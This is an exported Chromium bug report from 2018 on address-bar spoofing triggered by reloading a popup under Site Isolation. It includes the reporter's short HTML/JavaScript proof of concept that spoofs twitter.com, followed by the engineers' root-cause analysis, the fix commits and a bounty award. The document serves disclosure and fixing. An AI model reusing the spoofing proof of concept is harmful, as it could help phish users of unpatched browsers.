# Chrome URL Spoofing (via refreshed)

| Field | Value |
|-------|-------|
| **Issue ID** | [40091514](https://issues.chromium.org/issues/40091514) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Sandbox>SiteIsolation, UI>Browser>Navigation |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ev...@gmail.com |
| **Assignee** | cr...@chromium.org |
| **Created** | 2018-05-30 |
| **Bounty** | $500.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36

Steps to reproduce the problem:
1. Open url: https://server.n0tr00t.com/chrome/url_spoof_cmd_r.html
2. Click test text
3. Try use keyboard `command + r`
4. We will successfully see the hijacking effect of an arbitrary website

What is the expected behavior?
N/A

What went wrong?
Attach PoC.html

```
	<script>
	    function pwn() {
	        v = setInterval(`x=window.open('https://www.twitter.com:1234','test', 'width=400 height=300')`);
	        i = setInterval(`
	            x.document.write("<h1>url spoofing...</h1>");
	            clearInterval(v);
	            clearInterval(i);
	            `, 3333);
	    }
	</script>
	<li onclick="pwn()">step1: click me</li>
	<li>step2: try use keyboard `command + r`</li>
	<li>step3: xD</li>
```

Did this work before? N/A 

Chrome version: 67.0.3396.62  Channel: stable
OS Version: OS X 10.12.6
Flash Version: Shockwave Flash 29.0 r0

That the content of the page has been refreshed, and the `location` jump, url address bar has not been refreshed.

## Attachments

- [url_spoof_cmd_r.html](attachments/url_spoof_cmd_r.html) (text/plain, 558 B)
- [MG142.jpeg](attachments/MG142.jpeg) (image/jpeg, 66.0 KB)

## Timeline

### ev...@gmail.com (2018-05-30)

[Empty comment from Monorail migration]

### go...@chromium.org (2018-05-30)

+awhalley@ (Security TPM)

### go...@chromium.org (2018-05-30)

[Empty comment from Monorail migration]

### na...@chromium.org (2018-05-30)

[Empty comment from Monorail migration]

### cr...@chromium.org (2018-05-30)

I can confirm this on Mac Stable 67.0.3396.62 and Mac Canary 69.0.3445.0.  It's important to reload the popup window before the document.write occurs to trigger the spoof, otherwise the omnibox switches to about:blank (as we'd expect from the defenses in https://crbug.com/chromium/9682).

Something about the reload must interfere with the DidAccessInitialDocument logic.  I'll take a look, probably with dcheng@'s help if it ends up being on the Blink side.

[Monorail components: UI>Browser>Navigation UI>Security>UrlFormatting]

### cr...@chromium.org (2018-05-30)

Repros on Windows, Linux, and ChromeOS as well.  Marking medium severity, since it seems to require user interaction.  (It doesn't seem to work with a reload or additional navigation attempt in the script itself.)

### cr...@chromium.org (2018-05-30)

The difference here is that the manual reload seems to be converting the pending navigation from renderer-initiated (which doesn't stay visible if the initial page is accessed) to browser-initiated (which does stay visible, since the user made it happen).

Interestingly, this only happens in Site Isolation!  Most directly, it's due to this hosted app reload case in NavigationControllerImpl::Reload:
https://cs.chromium.org/chromium/src/content/browser/frame_host/navigation_controller_impl.cc?l=491

    // If we are reloading an entry that no longer belongs to the current
    // SiteInstance (for example, refreshing a page for just installed app), the
    // reload must happen in a new process. The new entry behaves as new
    // navigation (which happens to clear forward history). Tabs that are
    // discarded due to low memory conditions may not have a SiteInstance, and
    // should not be treated as a cross-site reload.
    SiteInstanceImpl* site_instance = entry->site_instance();
    // Permit reloading guests without further checks.
    bool is_for_guests_only = site_instance && site_instance->HasProcess() &&
        site_instance->GetProcess()->IsForGuestsOnly();
    if (!is_for_guests_only && site_instance &&
        site_instance->HasWrongProcessForURL(entry->GetURL())) {
      // Create a navigation entry that resembles the current one, but do not
      // copy page id, site instance, content state, or timestamp.
      NavigationEntryImpl* nav_entry = NavigationEntryImpl::FromNavigationEntry(
          CreateNavigationEntry(entry->GetURL(), entry->GetReferrer(),
                                entry->GetTransitionType(), false,
                                entry->extra_headers(), browser_context_,
                                nullptr /* blob_url_loader_factory */)
              .release());

      // Mark the reload type as NO_RELOAD, so navigation will not be considered
      // a reload in the renderer.
      reload_type = ReloadType::NONE;

      nav_entry->set_should_replace_entry(true);
      pending_entry_ = nav_entry;
      DCHECK_EQ(-1, pending_entry_index_);
    }


We end up hitting that block when Site isolation is enabled, because HasWrongProcessForURL returns false.  Apparently we still put the SiteInstance of the initiating document on pending NavigationEntries in NavigatorImpl::DidStartMainFrameNavigation, even we know we won't end up there.  That means the pending entry points to the attacker's SiteInstance, but the URL is for the victim site, so HasWrongProcessForURL returns false when RenderProcessHostImpl::IsSuitableHost sees the dedicated process isn't suitable.

As a result, the reload creates a new NavigationEntry with only some bits copied over from the old one, and it isn't considered renderer initiated.

We can probably do a quick fix by preserving the renderer-initiated bit in that case, but I think it's also worth looking at deeper changes as well here:

1) Can we do a better job setting the SiteInstance of the pending entry?  (Camille, will we be tracking it at all when we switch from pending NavigationEntries to NavigationRequests in https://crbug.com/chromium/803859?)

2) Do we need this HasWrongProcessForURL block anymore for hosted apps, or is it sufficiently handled in other ways?

[Monorail components: Internals>Sandbox>SiteIsolation]

### cl...@chromium.org (2018-05-31)

@creis: I don't think we will be tracking it at all eventually.

### sh...@chromium.org (2018-05-31)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-05-31)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/4391ff2884fe15b8d609bd6d3af61aacf8ad52a1

commit 4391ff2884fe15b8d609bd6d3af61aacf8ad52a1
Author: Charlie Reis <creis@chromium.org>
Date: Thu May 31 17:58:22 2018

Preserve renderer-initiated bit when reloading in a new process.

BUG=847718
TEST=See bug for repro steps.

Change-Id: I6c3461793fbb23f1a4d731dc27b4e77312f29227
Reviewed-on: https://chromium-review.googlesource.com/1080235
Commit-Queue: Charlie Reis <creis@chromium.org>
Reviewed-by: Nasko Oskov <nasko@chromium.org>
Cr-Commit-Position: refs/heads/master@{#563312}
[modify] https://crrev.com/4391ff2884fe15b8d609bd6d3af61aacf8ad52a1/content/browser/frame_host/navigation_controller_impl.cc
[modify] https://crrev.com/4391ff2884fe15b8d609bd6d3af61aacf8ad52a1/content/browser/frame_host/render_frame_host_manager_browsertest.cc


### cr...@chromium.org (2018-05-31)

The URL spoof itself should be resolved in r563312 (likely 69.0.3447.0).  Once it has a chance to bake, we can merge it to M68.  I don't think a merge to M67 is necessary even though it's Site Isolation specific (and Site Isolation is ramping up in M67), since it's mitigated by the fact the user has to reload at the right time to trigger the bug.

I've filed https://crbug.com/chromium/848446 for investigating the followup tasks from https://crbug.com/chromium/847718#c7.

### cr...@chromium.org (2018-05-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-01)

[Empty comment from Monorail migration]

### cr...@chromium.org (2018-06-01)

Confirmed that this is fixed in Windows Canary 69.0.3447.2.  I don't see any fallout from this CL on the crash dashboard, and I think it's small and simple enough to merge.

Requesting merge to M68.

### ab...@google.com (2018-06-01)

branch:3440

### bu...@chromium.org (2018-06-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/e2b2128499563d52a6c544ccc0b7280f55e61ac9

commit e2b2128499563d52a6c544ccc0b7280f55e61ac9
Author: Charlie Reis <creis@chromium.org>
Date: Fri Jun 01 22:07:56 2018

Merge to M68: Preserve renderer-initiated bit when reloading in a new process.

BUG=847718
TEST=See bug for repro steps.

Change-Id: I6c3461793fbb23f1a4d731dc27b4e77312f29227
Reviewed-on: https://chromium-review.googlesource.com/1080235
Commit-Queue: Charlie Reis <creis@chromium.org>
Reviewed-by: Nasko Oskov <nasko@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#563312}(cherry picked from commit 4391ff2884fe15b8d609bd6d3af61aacf8ad52a1)
Reviewed-on: https://chromium-review.googlesource.com/1083572
Reviewed-by: Charlie Reis <creis@chromium.org>
Cr-Commit-Position: refs/branch-heads/3440@{#103}
Cr-Branched-From: 010ddcfda246975d194964ccf20038ebbdec6084-refs/heads/master@{#561733}
[modify] https://crrev.com/e2b2128499563d52a6c544ccc0b7280f55e61ac9/content/browser/frame_host/navigation_controller_impl.cc
[modify] https://crrev.com/e2b2128499563d52a6c544ccc0b7280f55e61ac9/content/browser/frame_host/render_frame_host_manager_browsertest.cc


### aw...@chromium.org (2018-06-04)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-08)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-06-09)

Many thanks, evi1m0.bat@, $500 for this report.

### aw...@google.com (2018-06-09)

[Empty comment from Monorail migration]

### aw...@google.com (2018-07-23)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-08-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-09-07)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-01-04)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-05)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-05)

This issue was migrated from crbug.com/chromium/847718?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Internals>Sandbox>SiteIsolation, UI>Browser>Navigation, UI>Security>UrlFormatting]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091514)*
